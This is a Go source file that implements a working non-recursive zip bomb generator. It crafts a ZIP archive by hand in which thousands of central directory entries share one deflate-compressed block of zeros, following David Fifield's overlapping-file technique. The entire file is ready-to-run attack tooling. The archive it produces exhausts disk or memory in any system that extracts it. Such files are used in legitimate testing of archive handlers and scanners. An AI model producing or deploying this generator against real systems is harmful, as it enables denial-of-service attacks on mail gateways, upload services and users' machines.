package generator

import (
	"bytes"
	"compress/flate"
	"encoding/binary"
	"fmt"
	"hash/crc32"
	"io"
	"os"
	"time"
)

/*
ZIP File Format Reference:
==========================

[Local File Header 1]
[File Data 1]
[Local File Header 2]
[File Data 2]
...
[Central Directory Header 1]
[Central Directory Header 2]
...
[End of Central Directory Record]

OVERLAPPING TECHNIQUE (Shared Reference):
=========================================
All central directory entries point to the SAME local header offset (0).
The single local header + compressed data is shared by all "files".
This creates N files from 1 data block without recursion.

Based on concepts from David Fifield's zip bomb research (2019).
*/

const (
	// ZIP signatures
	localFileHeaderSig  = 0x04034b50
	centralDirHeaderSig = 0x02014b50
	endOfCentralDirSig  = 0x06054b50

	// Version needed to extract (2.0 for deflate)
	versionNeeded = 20
	versionMadeBy = 20

	// Compression method
	methodDeflate = 8

	// ZIP format limit (without ZIP64 extension)
	maxZipFiles = 65535
)

// GenerateOverlapping creates a non-recursive zip bomb using overlapping file entries
// All file entries point to the same compressed data block (Fifield method)
func GenerateOverlapping(config BombConfig) error {
	// Validate and cap file count at ZIP format limit
	if config.NumFiles > maxZipFiles {
		fmt.Printf("[!] Warning: file count %d exceeds ZIP limit of %d, capping\n",
			config.NumFiles, maxZipFiles)
		config.NumFiles = maxZipFiles
	}

	fmt.Printf("[*] Creating overlapping bomb: %d file entries\n", config.NumFiles)
	fmt.Printf("[*] Each file decompresses to: %d bytes\n", config.BaseSize)

	// Step 1: Create the compressed data block (zeros)
	compressedData, uncompressedSize, crc, err := createCompressedZeros(config.BaseSize)
	if err != nil {
		return fmt.Errorf("failed to create compressed data: %w", err)
	}
	fmt.Printf("[+] Compressed data block: %d bytes (from %d bytes)\n",
		len(compressedData), uncompressedSize)

	// Step 2: Build the ZIP file manually
	zipData, err := buildOverlappingZip(compressedData, uncompressedSize, crc, config.NumFiles)
	if err != nil {
		return fmt.Errorf("failed to build zip: %w", err)
	}

	fmt.Printf("[+] Total ZIP size: %d bytes\n", len(zipData))
	fmt.Printf("[+] Files in archive: %d\n", config.NumFiles)

	return os.WriteFile(config.OutputFile, zipData, 0644)
}

// createCompressedZeros creates a deflate-compressed block of zeros
func createCompressedZeros(size int64) ([]byte, uint32, uint32, error) {
	var compressed bytes.Buffer

	// Create deflate writer with best compression
	fw, err := flate.NewWriter(&compressed, flate.BestCompression)
	if err != nil {
		return nil, 0, 0, err
	}

	// Calculate CRC32 while writing zeros
	crc := crc32.NewIEEE()

	// Write zeros in chunks
	zeroChunk := make([]byte, 1024*1024) // 1MB chunks
	remaining := size

	for remaining > 0 {
		toWrite := int64(len(zeroChunk))
		if remaining < toWrite {
			toWrite = remaining
		}

		chunk := zeroChunk[:toWrite]
		crc.Write(chunk)

		_, err := fw.Write(chunk)
		if err != nil {
			return nil, 0, 0, err
		}
		remaining -= toWrite
	}

	if err := fw.Close(); err != nil {
		return nil, 0, 0, err
	}

	return compressed.Bytes(), uint32(size), crc.Sum32(), nil
}

// buildOverlappingZip constructs a ZIP with multiple entries pointing to same data
// All central directory entries reference the same local file header at offset 0
func buildOverlappingZip(compressedData []byte, uncompressedSize uint32, crc uint32, numFiles int) ([]byte, error) {
	var buf bytes.Buffer

	// Get current time for file timestamps
	modTime := time.Now()
	dosTime, dosDate := toDosDateTime(modTime)

	// The kernel filename - stored in local header
	kernelFilename := "data.bin"

	// Local header is always at offset 0
	const localHeaderOffset uint32 = 0

	// Write the single local file header
	writeLocalFileHeader(&buf, kernelFilename, compressedData, uncompressedSize, crc, dosTime, dosDate)

	// Write the compressed data ONCE
	buf.Write(compressedData)

	// Record where central directory starts
	centralDirOffset := uint32(buf.Len())

	// Write N central directory entries, all pointing to the same local header at offset 0
	// Each entry has a unique filename but references the same compressed data
	for i := 0; i < numFiles; i++ {
		filename := fmt.Sprintf("file_%d.bin", i)
		writeCentralDirHeader(&buf, filename, compressedData, uncompressedSize, crc,
			dosTime, dosDate, localHeaderOffset)
	}

	centralDirSize := uint32(buf.Len()) - centralDirOffset

	// Write end of central directory
	writeEndOfCentralDir(&buf, uint16(numFiles), centralDirSize, centralDirOffset)

	return buf.Bytes(), nil
}

// writeLocalFileHeader writes a ZIP local file header
func writeLocalFileHeader(w io.Writer, filename string, compressedData []byte,
	uncompressedSize uint32, crc uint32, dosTime, dosDate uint16) {

	binary.Write(w, binary.LittleEndian, uint32(localFileHeaderSig))
	binary.Write(w, binary.LittleEndian, uint16(versionNeeded))
	binary.Write(w, binary.LittleEndian, uint16(0)) // general purpose bit flag
	binary.Write(w, binary.LittleEndian, uint16(methodDeflate))
	binary.Write(w, binary.LittleEndian, dosTime)
	binary.Write(w, binary.LittleEndian, dosDate)
	binary.Write(w, binary.LittleEndian, crc)
	binary.Write(w, binary.LittleEndian, uint32(len(compressedData))) // compressed size
	binary.Write(w, binary.LittleEndian, uncompressedSize)
	binary.Write(w, binary.LittleEndian, uint16(len(filename)))
	binary.Write(w, binary.LittleEndian, uint16(0)) // extra field length
	w.Write([]byte(filename))
}

// writeCentralDirHeader writes a ZIP central directory header
func writeCentralDirHeader(w io.Writer, filename string, compressedData []byte,
	uncompressedSize uint32, crc uint32, dosTime, dosDate uint16, localHeaderOffset uint32) {

	binary.Write(w, binary.LittleEndian, uint32(centralDirHeaderSig))
	binary.Write(w, binary.LittleEndian, uint16(versionMadeBy))
	binary.Write(w, binary.LittleEndian, uint16(versionNeeded))
	binary.Write(w, binary.LittleEndian, uint16(0)) // general purpose bit flag
	binary.Write(w, binary.LittleEndian, uint16(methodDeflate))
	binary.Write(w, binary.LittleEndian, dosTime)
	binary.Write(w, binary.LittleEndian, dosDate)
	binary.Write(w, binary.LittleEndian, crc)
	binary.Write(w, binary.LittleEndian, uint32(len(compressedData))) // compressed size
	binary.Write(w, binary.LittleEndian, uncompressedSize)
	binary.Write(w, binary.LittleEndian, uint16(len(filename)))
	binary.Write(w, binary.LittleEndian, uint16(0)) // extra field length
	binary.Write(w, binary.LittleEndian, uint16(0)) // file comment length
	binary.Write(w, binary.LittleEndian, uint16(0)) // disk number start
	binary.Write(w, binary.LittleEndian, uint16(0)) // internal file attributes
	binary.Write(w, binary.LittleEndian, uint32(0)) // external file attributes
	binary.Write(w, binary.LittleEndian, localHeaderOffset)
	w.Write([]byte(filename))
}

// writeEndOfCentralDir writes the ZIP end of central directory record
func writeEndOfCentralDir(w io.Writer, numEntries uint16, centralDirSize, centralDirOffset uint32) {
	binary.Write(w, binary.LittleEndian, uint32(endOfCentralDirSig))
	binary.Write(w, binary.LittleEndian, uint16(0))  // disk number
	binary.Write(w, binary.LittleEndian, uint16(0))  // disk number with central dir
	binary.Write(w, binary.LittleEndian, numEntries) // entries on this disk
	binary.Write(w, binary.LittleEndian, numEntries) // total entries
	binary.Write(w, binary.LittleEndian, centralDirSize)
	binary.Write(w, binary.LittleEndian, centralDirOffset)
	binary.Write(w, binary.LittleEndian, uint16(0)) // comment length
}

// toDosDateTime converts time.Time to DOS date/time format
func toDosDateTime(t time.Time) (dosTime, dosDate uint16) {
	dosTime = uint16(t.Second()/2) | uint16(t.Minute())<<5 | uint16(t.Hour())<<11
	dosDate = uint16(t.Day()) | uint16(t.Month())<<5 | uint16(t.Year()-1980)<<9
	return
}
